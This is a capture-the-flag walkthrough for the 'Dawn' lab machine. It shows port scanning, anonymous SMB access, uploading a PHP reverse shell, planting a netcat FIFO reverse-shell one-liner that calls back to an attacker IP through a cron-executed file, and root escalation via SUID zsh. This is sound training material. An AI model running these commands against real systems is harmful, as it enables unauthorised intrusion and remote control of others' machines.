# Dawn

## Nmap

```
sudo nmap 192.168.152.11 -p- -sS -sV

PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
Service Info: Host: DAWN
```

On port 445 we are able to list shares without credentials. We see the share ITDEPT is open to us.

```
smbclient -U '' -L \\\\192.168.152.11\\
```

![](<../../../.gitbook/assets/image (1166).png>)

Connecting then directly to the ITDEPT share.

```
smbclient -U '' \\\\192.168.152.11\\ITDEPT
```

![](<../../../.gitbook/assets/image (1167).png>)

I then used `curl` to test for file upload on the share and confirmed was able to upload a PHP reverse shell which might come in handy for later.

```
curl --upload-file /home/kali/scripts/phpshell.php -u '' smb://192.168.152.11/ITDEPT//phpshell.php 
```

![](<../../../.gitbook/assets/image (1168).png>)

Running `dirsearch.py` on port 80 reveals two interesting directories.

```
python3 dirsearch.py -u http://192.168.152.11  -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 60 --full-url 
```

![](<../../../.gitbook/assets/image (1169).png>)

Moving into logs shows the a list of logs where management.log is the only one we have permission to access

![](<../../../.gitbook/assets/image (1170).png>)

When reading the log file we have the lines below appearing frequently.

```
2020/08/12 09:25:0 CMD: UID=33   PID=1360   | /bin/sh -c /home/dawn/ITDEPT/web-control
2020/08/12 09:25:0 CMD: UID=1000 PID=1359   | /bin/sh -c /home/dawn/ITDEPT/product-control
```

Knowing that we have write access to the ITDEPT share we can upload a reverse shell call it web-control and in theory this should execute.

Firstly I created a file called web-control and inserted a `netcat` reverse shell into it

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.152 80 >/tmp/f
```

This was then uploaded to the SMB share.

![](<../../../.gitbook/assets/image (1172).png>)

After doing so I soon receive a shell back on my `netcat` listener.

![](<../../../.gitbook/assets/image (1173).png>)

Then we can upgrade the shell to something nicer.

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

After doing so I then transferred over `linpeas` from my attacking machine by uploading to SMB. After running linpeas we identify the binary `zsh` as having the SUID bit set.

![](<../../../.gitbook/assets/image (1174) (1).png>)

As `zsh` is a shell binary all we need to do is execute the full path of `zsh` to gain a root shell.

```
/usr/bin/zsh
```

![](<../../../.gitbook/assets/image (1176).png>)
